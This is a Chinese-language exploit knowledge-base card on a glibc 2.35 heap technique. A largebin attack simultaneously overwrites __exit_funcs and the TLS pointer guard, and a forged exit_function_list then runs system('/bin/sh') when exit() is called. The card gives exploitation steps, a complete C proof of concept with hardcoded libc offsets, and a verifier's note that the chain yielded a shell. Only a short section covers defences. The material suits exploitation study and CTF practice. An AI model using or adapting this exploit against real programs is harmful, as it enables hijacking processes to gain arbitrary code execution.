---
id: binary-pwn-heap-exit-initial-largebin-tls-key-forge
title: glibc 2.35 exit 链利用：largebin attack 同时改 __exit_funcs 与 TLS pointer_chk_guard，伪造 initial 调 system
type: scenario
domain: binary
path: binary/pwn/heap
technique: glibc-exit-initial-largebin-tls-guard-forge
tags:
- pwn
- heap
- glibc
- glibc235
- exit-handler
- largebin
- tls
- pointer-guard
- initial
- system
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-18
  verified_at: '2026-11-08T09:21:25+08:00'
  notes: 已对照原文与37张截图核对，实测证据充分：img21 __exit_funcs→0x4064f0(堆)，img22 TLS 0x7ffff7fa3770→0x405b30(堆)，img24 cur->idx=0x511，img26 按 flavor 3/4/2 分派，img32 xor fs:0x30 后 RAX=puts，img34/35 call rax 输出 GNU，img36 system 且 rdi 指向 /bin/sh，img37 ./my_poc 打印 libc_base/fake_key/&exit_function/&TLS、两次 GNU 后出现 $ ls 文件列表，确为打通拿 shell 而非半链。已修正一处原理表述：PTR_DEMANGLE 顺序应为 ror 0x11 后 xor fs:0x30（原写反，与 img10/img32 不一致），卡片与 staging 均已改。未验证点：原文在关闭 ASLR 下、TLS 偏移按调试值硬编码，且 cur->idx 不可控导致上千次空转、依赖堆内残留 flavor 不为 2/3/4，实际靶场稳定性未验证，confidence medium 合理。
url: /docs/binary/pwn/heap/binary-pwn-heap-exit-initial-largebin-tls-key-forge/
draft: false
kb_aliases:
- exit 漏洞利用
- __run_exit_handlers 劫持
- exit_function_list 伪造
- initial 结构体劫持
- largebin attack 改 TLS
- pointer_chk_guard 改写
- PTR_DEMANGLE 绕过
---

## 一句话结论

在 glibc 2.35 上，一次 largebin attack 可以同时把 `__exit_funcs`（全局 `initial` 指针）和 TLS 里的 `pointer_chk_guard`（`fs:0x30`）都改成堆地址；随后用这个堆地址作为“已知 key”算出 `PTR_DEMANGLE` 的逆变换，在可控 chunk 里伪造 `exit_function_list`，`exit()` 时 `__run_exit_handlers` 就会按 `flavor` 分派执行任意函数（如 `system("/bin/sh")`），且第一个参数（或第二参数）可控。

## 原理

`exit()` 的主流程是 `exit → __run_exit_handlers`。后者先调用 `__call_tls_dtors`，随后进入一个循环：

```c
listp = &__exit_funcs;              // 全局变量，默认指向 libc 的 initial 常量
while (true) {
    cur = *listp;                   // 取出 exit_function_list
    if (cur == NULL) break;
    ...
    while (cur->idx > 0) {
        f = &cur->fns[--cur->idx];  // 按 idx 从大到小遍历
        switch (f->flavor) {
        case ef_free: case ef_us: break;
        case ef_on:
            onfct = f->func.on.fn; arg = f->func.on.arg;
            PTR_DEMANGLE(onfct); onfct(status, arg); break;
        case ef_at:
            atfct = f->func.at; PTR_DEMANGLE(atfct); atfct(); break;
        case ef_cxa:
            cxafct = f->func.cxa.fn; arg = f->func.cxa.arg;
            PTR_DEMANGLE(cxafct); cxafct(arg, status); break;
        }
    }
    listp = &cur->next;             // 支持链表多节点
}
```

两个可控点：

1. **`initial` 指针本身可被改**：`__exit_funcs` 是 libc 的全局变量，只要能在该地址写入一个堆地址（指向攻击者布置的伪造 `exit_function_list`），`cur` 就完全可控——`next`、`idx`、`fns[]` 的 `flavor`、函数指针、`arg` 都来自伪造块。
2. **函数指针是加密的**：`f->func.*.fn` 存的是 `PTR_MANGLE` 后的值，`PTR_DEMANGLE` 的实现是 `ror $0x11` 后 `xor %fs:0x30`（x86-64，对应原文 `ror $2*LP_SIZE+1` + `xor __pointer_chk_guard_local` 的截图）。所以要伪造调用，必须知道 `pointer_chk_guard`（`fs:0x30`）。若能把该值改成已知的堆地址，就能在 Exp 里用 `rol(addr ^ key, 0x11)` 直接算出密文。

largebin attack 恰好能一次满足两件事，因为它能在任意地址写入的是“chunk 地址”这个堆指针：

- 把目标地址写到 `bk_nextsize`（偏移按插入路径取 `目标-0x20` 或 `目标-0x10`，以本地 glibc 源码的 `fwd->bk_nextsize->fd_nextsize = chunk` 为准），插入时就把 chunk 地址写到目标；
- 一条链写 `__exit_funcs`，另一条链写 `fs:0x30`（TLS 段，`pointer_chk_guard` 位置），两条链在同一轮 unsortedbin 拆分中同时完成。

`idx` 取值为伪造块的 chunk size（因为 `cur->idx` 落在 size 字段上，通常 ≥ 0x400），因此循环会先空转很多次；空转时落在堆块内部的 `flavor` 多为 0/1（`ef_free`/`ef_us` 直接 `break`），不会误触发，等 `idx` 递减到真实条目时再按布置执行。

## 触发条件

- glibc 2.x（示例为 2.35，`__free_hook` 不可用、只能走 IO/exit 一类的“无 hook”路径）；
- 具备任意地址分配 + 可控 show（可泄露 libc 与堆地址），并能用 largebin attack 在任意地址写入堆指针；
- 能拿到 TLS 段地址（`fs:0x30` 相对 ld 固定，不是相对 libc 固定；示例在关闭 ASLR 时使用调试得到的偏移）；
- 程序退出时走 `exit()`（`return` 从 `main` 也等价），且 `__run_exit_handlers` 的 `initial` 未被 `atexit` 链表额外节点干扰。

## 利用步骤

1. 布置 4 个 chunk，分别落在两个 size 不同的 largebin 区间；释放两个进 unsortedbin，泄露 `main_arena` 得 libc 基址，另一个 chunk 的 fd/bk 得堆地址；
2. 计算 `pointer_chk_guard` 的目标值：直接用堆地址（`fake_key = heap + offset`），因为 largebin 只能写堆指针；
3. 在可控 chunk 里按 `exit_function_list` 布局写入：`next=0`、`idx=条目数`、每个 `fns[i]` 为 `{flavor=4(ef_cxa), fn=rol(target^key,0x11), arg, dso_handle}`；
4. 第一轮 largebin 布置：把两个 largebin 头的 `bk_nextsize` 改成 `TLS_addr-0x18` 与 `__exit_funcs-0x20`；
5. 再触发一轮 unsortedbin 拆分，使两次插入分别把 chunk 地址写到 TLS 和 `__exit_funcs`；
6. 调用 `exit(0)`，`__run_exit_handlers` 取到伪造 `initial`，空转后依次执行布置的 `puts`、`system("/bin/sh")`。

## PoC

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

void *p[0x10];
uint64_t rol(uint64_t num, unsigned int shift) { return (num << shift) | (num >> (64 - shift)); }

int main()
{
    p[0] = malloc(0x460); malloc(0x10);
    p[1] = malloc(0x450); malloc(0x10);
    p[2] = malloc(0x510); malloc(0x10);
    p[3] = malloc(0x500); malloc(0x10);
    free(p[0]); free(p[2]);

    long long libc_base = (long long)(*(void **)p[0]) - 0x21ace0;   // unsortedbin -> main_arena
    long long heap_addr = (long long)(*(void **)p[2]);
    long long fake_key  = heap_addr + 0x490;                        // 写入 fs:0x30 的堆地址
    long long exitfunc_addr = libc_base + 0x21a838;                 // &__exit_funcs
    long long TLS_addr      = libc_base + 0x3a3768;                 // fs:0x30 附近

    long long puts_addr   = libc_base + 0x80e50;
    long long system_addr = libc_base + 0x50d70;
    long long bin_sh      = libc_base + 0x1d8678;
    long long GNU_s       = libc_base + 0x3c32b4;

    long long fake_initial[] = {
        4, 0xdeadbeef, 0xdeadbeef, 0x7777,
        4, rol(system_addr ^ fake_key, 0x11), bin_sh, 0x7777,
        4, rol(puts_addr   ^ fake_key, 0x11), GNU_s,  0x7777,
        4, rol(puts_addr   ^ fake_key, 0x11), GNU_s,  0x7777
    };
    memcpy(p[3], fake_initial, sizeof(fake_initial));   // idx 最终为 3

    malloc(0x600);              // 把 p0/p2 置入 largebin
    free(p[1]); free(p[3]);     // 第二轮 unsortedbin
    *((long long *)((char *)p[0] + 0x18)) = TLS_addr - 0x18;
    *((long long *)((char *)p[2] + 0x18)) = exitfunc_addr - 0x20;
    malloc(0x600);              // 触发两次插入，同时改写 TLS 与 __exit_funcs

    exit(0);                    // 触发 __run_exit_handlers
}
```

实际运行时还需要：把 TLS 偏移改为与 ld 一致的运算（原文在关闭 ASLR 下用调试偏移），并用 gdb 核对 `__exit_funcs`、`fs:0x30` 是否已变成堆地址。

## 变体与关联

- 与 [[binary-pwn-heap-glibc-exit-initial-pointer-guard-forge-system]] 的差异：那张卡是 glibc 2.41 直接写 `pointer_guard=0` 再伪造 `initial`；本卡在 2.35 上必须借 largebin 才能同时改 TLS，且 key 变成已知堆地址、需用 `ROL17(xor)` 自行加密函数指针；
- 变体：若能把 `__exit_funcs` 指向的 chunk 分配到 `initial` 常量所在位置（任意地址分配），可直接泄露原有 `PTR_MANGLE(dl_fini)` 反推 key，省掉改 TLS 一步；
- 变体：`flavor=2`（`ef_on`）分支可调用 `fn(status, arg)`，第二参数可控；`flavor=3`（`ef_at`）无参调用，适合 `one_gadget`；
- 关联：[[binary-pwn-heap-house-of-banana-link-map-dl-fini]]（同样劫持 `_dl_fini` 相关结构）、IO 结构体 `_IO_str_jumps` 一类的“无 hook 时代”利用。

## 检测与防御

- 该链完全发生在进程内，检测侧只能靠加固：编译期启用 `-fstack-protector-all`、FORTIFY、`-D_FORTIFY_SOURCE=3`；
- glibc 2.35+ 已移除 `__free_hook`/`__malloc_hook`，但 `exit` 链仍是有效目标；开启 `safe-linking` 与指针 mangling 只能提高门槛，不能防“先改 key 再伪造”；
- 缓解：`atexit` 注册项尽量少、退出前主动 `_exit()`（跳过 handler）、在关键服务中用 `__libc_atexit` 之外的退出路径；
- 检测（比赛/研究场景）：用 gdb watchpoint 监控 `__exit_funcs` 与 `fs:0x30` 的写入，配合 ASLR 开启验证利用稳定性。
